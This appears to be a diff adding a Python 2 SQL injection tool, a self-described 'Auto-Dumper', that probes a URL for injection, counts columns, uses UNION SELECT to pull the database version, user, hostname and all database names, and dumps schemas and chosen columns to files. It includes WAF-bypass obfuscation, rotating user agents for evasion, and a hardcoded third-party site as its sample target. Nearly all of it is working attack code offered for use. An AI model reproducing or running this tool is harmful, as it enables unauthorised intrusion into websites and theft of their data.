@@ -1,0 +1,590 @@
+# Created By _UserName_
+#
+# What I Can Do:
+#   determine if site is vuln to SQLi
+#   figures number of columns to use or union select statement in 1 request (a large group by)
+#   get version, current user, etc
+#   displays all databases on server
+#   tries to dump database in one request
+#
+import urllib2, random, threading, os
+from datetime import datetime
+#
+# Pre-built with sample run, check bottom of page
+# Program Is Made To Be Modular To Allow For Use As A Framework
+#
+# Final Release *Possibilities*:
+#   GUI or Console Options
+#   Add Error Based Injection
+#
+###################### Commands ##################
+##  findMe()                                              Prints your WAN Address and the country it is located in
+##                                                             -Helpful to determine if program is captured by a/your proxy/VPN
+##  getServer(url)                                        Displays the server the website is running on
+##  isSiteVulnerable(url)                                 0 is vulnerable / 1 is not
+##  getColumns(url)                                       Returns column count / -1 if can't idenify injection type / and -2 for any error
+##  findVulnColumnNumbers(url, columns, stringInj)        Returns list of vuln columns, can be empty
+##  getImpData(url, totalColumns, column, stringInj)      Does not return anything
+##                                                             -Displays: version, current user, datadir, prim database, and hostname
+##  getAllDatabases(url, totalColumns, column, stringInj) Displays All Databases (BUGGY if group_concat doesn't work)
+##  dumpDatabase(url, totalColumns, column, stringInj)    Creates an HTML file that contains the entire database
+##
+##  extractInfoFromColumns(url, totalColumns, column, table, columnToExt, stringInj, saveToLog=True)
+##                                                                                         Extracts data from a specific table and column
+##                                                                                              - Saves result(s) to a text file (default)
+###################### End ######################
+#
+# Program Name
+progName = "_UserNames_ Auto-Dumper v1.0"
+#
+# Use WAF Bypassing Techniques
+# False - Don't
+# True  - Do
+WAFSupport = False
+#
+# Codes Used To Determine Where To Split The Text To Extract Data
+### Generate A Random String
+chars = ['0123456789abcdefghijkmlmnopqrstuvwxyz']
+end = ''.join(random.choice(chars) for x in range(random.randint(5, 25)))[:10]
+splitF = '<!-- _username_ -->'
+splitE = '<!-- '+end+' -->'
+splitF_hex = ('0x' + splitF.encode('hex'))
+splitE_hex = ('0x' + splitE.encode('hex'))
+
+#######################################################################
+
+def logo():
+    design = (
+        "        __  __           _  __                _          \n"+
+        "       / / / ______ ____/ |/ ___ ___ _ ___   ( )___       \n"+
+        "      / /_/ (_-/ -_/ __/    / _ `/  ' / -_)  |/(_-<      \n"+
+        "   ___\\____/___\\__/_/ /_/|_/\\_,_/_/_/_\\______ /___/  \n"+
+        "  /___/                                 /___/            \n"+
+        "                                                         \n"+
+        "     ___       __          ___                           \n"+
+        "    / _ |__ __/ /____     / _ \\__ ____ _  ___ ___ ____  \n"+
+        "   / __ / // / __/ _ \\   / // / // /  ' \\/ _ / -_/ __/ \n"+
+        "  /_/ |_\_,_/\\__/\\___/  /____/\\_,_/_/_/_/ .__\\__/_/  \n"+
+        "                                       /_/               \n"+
+        "---------------------------------------------------------\n")
+    print design
+
+#######################################################################
+
+def folder():
+    now = datetime.now()
+    dirName = ('Dump %d-%d-%d') % (now.day, now.month, now.year)
+    if not (os.path.exists(dirName)):
+        os.mkdir(dirName)
+    return dirName
+
+#######################################################################
+
+# Where Do You Appear To Be From?
+# Borrowed URLS From zBot
+def findMe():
+    IP = urllib2.urlopen('http://bot.whatismyipaddress.com/').read()
+    print 'Your IP Appears To Be: %s' % IP
+    if (IP == 'Unknown IP'):
+        country = ''
+    else:
+        country = urllib2.urlopen('http://api.wipmania.com/' + IP).read()
+        print 'You Appear To Be In:   %s' % country
+    return country
+
+#######################################################################
+# Random sites for referer
+referers = [
+    'http://www.google.com',
+    'http://www.bing.com/',
+    'http://www.yahoo.com/',
+    'https://www.facebook.com/',
+    ' '
+    ]
+# List of User Agents
+user_agents = [
+    'Mozilla/5.0 (PLAYSTATION 3; 3.55)',
+    'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.62 Safari/537.36',
+    'Mozilla/5.0 (X11; CrOS i686 4319.74.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36',
+    'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
+    'Mozilla/5.0 (Windows; U; Windows NT 6.1; it; rv:2.0b4) Gecko/20100818',
+    'Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0',
+    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
+    'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))',
+    'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
+    'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.13+ (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10'
+    ]
+
+def generateRequest(url):
+    req = urllib2.Request(url)
+    req.add_header('Referer', random.choice(referers))
+    req.add_header('User-agent', random.choice(user_agents))
+    return req
+
+def accessURL(url, identWAF=False):
+    try:
+        req = generateRequest(url)
+        site = urllib2.urlopen(req)
+        source = site.read().lower()
+        site.close()
+        if(identWAF == True):
+            t = IdentWAF(source)
+            t.start()
+        return source
+    except urllib2.HTTPError, e:
+        print "[*] Error: The Server Couldn't Answer The Request.\n[*] Reason: ", e.reason
+        return ''
+    except urllib2.URLError, e:
+        print "[*] Error: The Server Couldn't Be Reached.\n[*] Reason: ", e.reason
+        return ''
+    except Exception, e:
+        print "[*] An Error Has Occurred: %s.\n[*] Exiting Program." % str(e)
+        return ''
+
+def getServer(url):
+    try:
+        # Get Server Name
+        site = urllib2.urlopen(url)
+        server = site.info().getheader('Server')
+        print 'Server: %s' % server
+        site.close()
+    except urllib2.HTTPError, e:
+        print "[*] Error: The Server Couldn't Answer The Request.\n[*] Reason: ", e.reason
+    except urllib2.URLError, e:
+        print "[*] Error: The Server Couldn't Be Reached.\n[*] Reason: ", e.reason
+    except Exception, e:
+        print "[*] An Error Has Occurred: %s.\n[*] Exiting Program." % str(e)
+
+def filterData(data):
+    a = data.split(splitF, 1)
+    if(a[0] is not data):
+        b = a[1].split(splitE, 1)
+        return b[0]
+    return ''
+
+def filterDataError(data):
+    a = data.split(splitF, 1)
+    if(a[0] is not data):
+        b = a[1].split(splitE, 1)
+        return b[0]
+    return ''
+
+################################################################################
+
+class IdentWAF(threading.Thread):
+    def __init__(self, data):
+        threading.Thread.__init__(self)
+        self.data = data
+    def run(self):
+        identifyWAF(self.data)
+    
+def identifyWAF(data):
+    errorFound = False
+    
+    # A WAF Error Message Database
+    errors = {
+        'Use Error Based':'the used select statements have a different number of columns',
+        'Mod_Security':'mod_security',
+        '403 Error':'forbidden'
+        }
+    k = errors.keys()
+        
+    for i in range(len(k)):
+        if(data.find(errors[k[i]]) > 0):
+            print '[*] Reason Cannot Inject:\n\t' + k[i]
+            errorFound = True
+            break
+    if(errorFound == False):
+        print '[*] Cannot Determine What Is Wrong With Injection'
+
+################################################################################
+
+def checkForError(source, col=0):
+    # Is Error Message Found
+    errorFound = False
+    # Possible Error Messages
+    vulnMessages = ['you have an error in your sql syntax','mysql_num_rows()', 'unknown column']
+    if(col == 1):
+        for mess in range(len(vulnMessages)):
+            if(source.find(vulnMessages[mess]) >= 0):
+                errorFound = True
+                break
+    else:
+        # Finds position of 'unknown source' in vulnMessage
+        if(source.find(vulnMessages[vulnMessages.index('unknown column')]) >= 0):
+            errorFound = True
+    if(errorFound == True):
+        return 0
+    return 1
+
+def command(number, param1='', param2=''):
+    if(number == 1):
+        ret = space() + 'group' + space() + 'by' + space()
+    elif(number == 2):
+        ret = space() + conC()
+    elif(number == 3):
+        ret = space() + union() + space() + select() + space()
+    elif(number == 4):
+        ret = space() + From() + space() + infoSchema() + '.'
+    elif(number == 5):
+        # Dump Database In-One-Shot
+        ret = (
+            "(" + select() + space() + "(@x)" + space() + From() +
+            "(" + select() + space() + "(@x:=0x00)," + space() + "(" + select() + space() + "(0)" + From() + space() + "(" + infoSchema() + "." + columns() + ")" +
+            "where" + space() + "(table_schema!=0x" + "information_schema".encode('hex') + ")" + space() +  "and" + space() + "(0x00)" + space() + "in" + space() +
+            "(@x:=" + conC() + "(@x,0x" + "<br>".encode('hex') + "</font><font color=red>".encode('hex') + ",table_schema," + "0x" + " --> ".encode('hex') + "</font><font color=blue>".encode('hex') +
+            ",table_name,0x" + " --> ".encode('hex') + "</font><font color=green>".encode('hex') + ",column_name))))x)"
+            )
+    elif(number == 6):
+        # Command To Prettify Dump File
+        ret = ("<body bgcolor='black'><center><font color='white'><h1>Database Dumped By " + progName  + "</h1>" +
+               "<h3>URL: " + param1 + "</h3><p><u>Database --> Table Name --> Column Name</u></p></font>")
+    elif(number == 7):
+        # Extract Specific Data From A Table
+        ret = ("(" + select() + space() + "(@x)" + space() + From() + space() + "(" + select() +
+            "(@x:=0x00)," + space() + "(" + select() + space() + "(0)" + space() + From() + space() +
+            "(" + param1 + ")" + space() + "where" + space() + "(0x00)" +space() + "in" + space() +
+            "(@x:=" + conC() +  "(" + param2 + "))))x)")
+    # Command Not Found
+    else:
+        ret = ''
+    return str(ret)
+
+#############################################################################
+############################ CHANGE TO BYPASS WAF ###########################
+#############################################################################
+
+def schemata():
+    if(WAFSupport == True):
+        return '/*12345sChEmAtA*/'
+    return 'schemata'
+def tables():
+    if(WAFSupport == True):
+        return random.choice(['/*!12345kEy_CoLuMn_UsAgE*/', '/*!12345sTaTiStIcS*/'])
+    return 'tables'
+def columns():
+    if(WAFSupport == True):
+        return random.choice(['/*!12345kEy_CoLuMn_UsAgE*/', '/*!12345sTaTiStIcS*/'])
+    return 'columns'
+
+def makeFalse():
+    # Just makes the execution statement false to show the numbers on the screen
+    return space() + 'and' + space() + '0' + space()
+
+def From():
+    if(WAFSupport == True):
+        return '/*!12345FrOm*/'
+    return 'from'
+
+def conC():
+    if(WAFSupport == True):
+        return '/*!12345cOnCaT*/'
+    return 'concat'
+def groupConC():
+    if(WAFSupport == True):
+        return '/*!12345gRoUp_cOnCaT*/'
+    return 'concat'
+
+def infoSchema():
+    if(WAFSupport == True):
+        return '/*!12345InFoRmAtIoN_ScHeMaTa*/'
+    return 'information_schema'
+
+def union():
+    if(WAFSupport == True):
+        return '/*!12345%55nIoN*/'
+    return 'union'
+
+def select():
+    if(WAFSupport == True):
+        return '/*!12345%53eLeCt*/'
+    # Select value
+    return 'select'
+
+def space():
+    if(WAFSupport == True):
+        return random.choice(['%0a','%0b', '%0a%0d'])
+    # The Space Character
+    return '%20'
+
+def ending():
+    # To comment out the rest of the code on a line
+    return random.choice(['--+', '#'])
+
+#############################################################################
+############################# END OF COMMANDS ###############################
+#############################################################################
+
+def isSiteVulnerable(url):
+    # Append ' To End
+    attack_url = url + "'"
+    source = accessURL(attack_url)
+    #
+    if(checkForError(source, 1) == 1):
+            print "[+] <" + url + "> Is NOT Vulnerable"
+            return 1
+    else:
+        print "[+] <" + url + "> Is Vulnerable"
+    return 0
+
+######################################################################
+
+# Tests If Injection Is Integer or String Based And If It Needs A ) or Not
+def determineInjectionType(url):
+    # A High, Unlikely To Exist Columns Number
+    column = 9999
+    # Test If Integer Based
+    attack_url = url + command(1) + str(column) + ending()
+    test = checkForError(accessURL(attack_url))
+    if (test == 0):
+        return ''
+    else:
+        # Test If String Based
+        attack_url = url + "'" + command(1) + str(column) + ending()
+        test = checkForError(accessURL(attack_url))
+        if (test == 0):
+            return "'"
+        else:
+            # Test If Needs ) Based
+            attack_url = url + ")" + command(1) + str(column) + ending()
+            test = checkForError(accessURL(attack_url))
+            if(test == 0):
+                return ")"
+            else:
+                attack_url = url + ")'" + command(1) + str(column) + ending()
+                test = checkForError(accessURL(attack_url))
+                if (test == 0):
+                    return ")'"
+                else:
+                    # Neither Worked return -1
+                    return 'exit'
+
+######################################################################
+
+def getColNumber(data):
+    column = 0
+    try:
+        a = data.split('unknown column \'')
+        if (data == a[0]):
+            print '1'
+            return column
+        b = a[1].split('\' in \'group statement')
+        column = int(b[0])
+        return column
+    except Exception, e:
+        print e
+
+# Uses Group By Statement
+def getColumns(url):
+    columns = '1'
+    max_column = 50
+    
+    # Test If Need To Use String Injection
+    stringInj = determineInjectionType(url)
+    if(stringInj == 'error'):
+        # See If WAF Is There
+        accessURL(url, True)
+        print '[*] Could Not Identify Injection Type'
+        return -1
+    
+    for x in range(2, max_column):
+        columns += ',' + str(x)
+    
+    attack_url = url + stringInj + command(1) + str(columns) + ending()
+    data = accessURL(attack_url)
+    
+    columns = getColNumber(data) - 1
+    return columns, stringInj
+
+######################################################################
+###################### UNION SELECT METHOD ##########################
+######################################################################
+
+# Turn Column Number Into A String For UNION SELECT Use
+# ex genCol_s(5) returns [ , ', )] 1,2,3,4,5
+def genCol_s(columns):
+    col_s = ''
+    # Empty To Start
+    c = 1
+    while (c!=columns):
+        # Make columns_str equal to columns (ie 5 columns = 1,2,3,4,)
+        col_s += str(c) + ','
+        c = c + 1
+    # Add Last Column Number
+    col_s += str(columns)
+    return col_s
+
+def formatColString(col_s, column, rep_with):
+    return col_s.replace(','+str(column), ','+(command(2)+'('+splitF_hex+','+rep_with+','+splitE_hex+')'))
+
+def findVulnColumnNumbers(url, columns, injType):
+    print "\tFound %i Columns\n" % columns
+    
+    col_s = genCol_s(columns)
+    injType += space()
+    falsify = makeFalse()
+    # List To Hold Vulnerable Columns
+    vulnCols = []
+    for i in range(0, columns+1):
+        a = formatColString(col_s, i, str(i))
+        attack_url = url + injType + falsify + command(3) + a + ending()
+        data = filterData(accessURL(attack_url))
+        if(data != ''):
+            print '[+] Vulnerable Column Found: ' + str(i)
+            vulnCols.append(i)
+    if (vulnCols == []):
+        print '[--] No Vulnerable Column(s) Found'
+        # See If WAF Is There
+        accessURL(url, True)
+        return vulnCols
+    return vulnCols
+
+def getImpData(url, totalColumns, column, injType):
+    print '\tPossibly Useful Data For You:\n'
+    
+    injType += space()
+    falsify = makeFalse()
+    # Information To Extract
+    dataToExtract = {'Version: ':'version()', 'User: ':'user()', 'Primary Database: ':'database()', 'Hostname: ':'@@hostname', 'Data Directory: ':'@@datadir'}
+    k = dataToExtract.keys()
+    # Generate Column String
+    col_s = genCol_s(totalColumns)
+    
+    # Get Server Information
+    getServer(url)
+    
+    for i in range(len(k)):
+        a = formatColString(col_s, column, dataToExtract[k[i]])
+        attack_url = url + injType + falsify + command(3) + a + ending()
+        data = filterData(accessURL(attack_url))
+        if(data != ''):
+            print k[i] + data
+        else:
+            print '[--] Could Not Extract: ' + k[i]
+
+def getAllDatabases(url, totalColumns, column, injType):
+    data = ''
+    injType += space()
+    falsify = makeFalse()
+    # Generate Column String
+    col_s = genCol_s(totalColumns)
+
+    a = formatColString(col_s, column, groupConC() + '(schema_name)')
+    attack_url = url + injType + falsify + command(3) + a + command(4) + schemata() + ending()
+    data = filterData(accessURL(attack_url))
+    if(data != ''):
+        print 'Found Database(s):'
+        new_data = data.split(',')
+        for i in range(len(new_data)):
+            print "    " + new_data[i]
+        
+    else:
+        # Doesn't Fully Work, So May Print Nothing
+        # Must Use Limit Now
+        x = 0
+        data = 'START'
+        while (data != ''):
+            a = formatColString(col_s, column, 'schema_name')
+            attack_url = url + injType + falsify + command(3) + a + command(4) + schemata() + space() + 'limit '+str(x)+',1' + ending()
+            data = filterData(accessURL(attack_url))
+            x += 1
+            if(data != ''):
+                print data
+    return
+
+def dumpDatabase(url, totalColumns, column, injType):
+    # Does Not Always Work
+    # HTML File To Save Dump To
+    filename = folder() + "\\DUMP.html"
+    # Declare Variables
+    data = ''
+    injType += space()
+    falsify = makeFalse()
+    # Generate Column String
+    col_s = genCol_s(totalColumns)
+    
+    a = formatColString(col_s, column, command(5))
+    attack_url = url + injType + falsify + command(3) + a + ending()
+    data = filterData(accessURL(attack_url))
+    if (data != ''):
+        print '[+] Database Dumped To: %s' % (filename)
+        f=open(filename, 'w')
+        f.write(command(6, url))
+        f.write(data)
+        f.close()
+    
+def extractInfoFromColumns(url, totalColumns, column, table, columnToExt, injType, saveToLog=True):
+    filename = folder() + '\\ExtractedData.txt'
+    data = ''
+    injType += space()
+    falsify = makeFalse()
+    
+    # Generate Column String
+    col_s = genCol_s(totalColumns)
+    
+    a = formatColString(col_s, column, command(7, table, columnToExt))
+    attack_url = url + injType + falsify + command(3) + a + ending()
+    
+    data = filterData(accessURL(attack_url))
+    if(data != ''):
+        output = ('\n' + table +' --> ' + columnToExt)
+        info = data.split(',')
+        for i in range(len(info)):
+            output += '\n: ' + info[i]
+        if(saveToLog == True):
+            f = open(filename, 'a')
+            f.write(output)
+            f.close()
+        print output + '\n'
+        
+    else:
+        print '[--] Cannot Extract Column Info'
+
+##################################################################################################################
+
+def main():
+    try:
+        # Example Setup
+        # Feel Free To Change What Is Displayed and Its Order
+        
+        # Display My Logo
+        logo()
+        
+        #print "[*] Enter URL To Attack:"
+        #url = raw_input("> ")
+        url = "http://www.techvision.co.uk/news.php?id=45"
+        
+        findMe()
+        print '------------------------------------'
+        isVuln = isSiteVulnerable(url)
+        if(isVuln == 0):
+            print '------------------------------------'
+            column, stringInj = getColumns(url)
+            
+            if (column >= 0):
+                vuln = findVulnColumnNumbers(url, column, stringInj)
+                if(len(vuln) > 0):
+                    print '------------------------------------'
+                    getImpData(url, column, vuln[0], stringInj)
+                    print '------------------------------------'
+                    getAllDatabases(url, column, vuln[0], stringInj)
+                    print '------------------------------------'
+                    dumpDatabase(url, column, vuln[0], stringInj)
+                    print '------------------------------------'
+                    # Extract Data From A Column
+                    table_name = ''
+                    print '[*] Column Extraction Shell Started'
+                    print '[*] Type "exit" To Quit'
+                    while ((table_name!='exit') and (table_name!='quit')):
+                        table_name = raw_input('Table Name:\n> ')
+                        if((table_name.lower()!='exit') and (table_name.lower()!='quit')):
+                            column_name = raw_input('Column Name:\n> ')
+                            extractInfoFromColumns(url, column, vuln[0], table_name, column_name, stringInj)
+    except KeyboardInterrupt:
+        print 'Exiting'
+    raw_input("\n\nPress [ENTER] To Exit...\n")
+
+main()
